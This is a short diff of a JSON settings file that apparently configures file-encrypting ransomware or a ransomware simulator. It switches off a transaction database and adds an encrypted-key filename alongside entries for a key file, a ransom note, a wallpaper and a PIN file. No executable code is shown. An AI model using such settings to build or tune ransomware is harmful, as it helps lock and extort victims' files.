@@ -10,7 +10,7 @@
 	},
 	"crypto": {
 		"opts": {
-			"transaction_db": true,
+			"transaction_db": false,
 			"everything": true,
 			"simulation": false,
 			"hidden": false,
@@ -110,6 +110,7 @@
 		"filename": {
 			"log": "Logger.log",
 			"key": "KEY.key",
+			"ekey": "KEY.ekey",
 			"note": "README",
 			"wallpaper": "Wallpaper.jpg",
 			"pin": "PIN.txt",
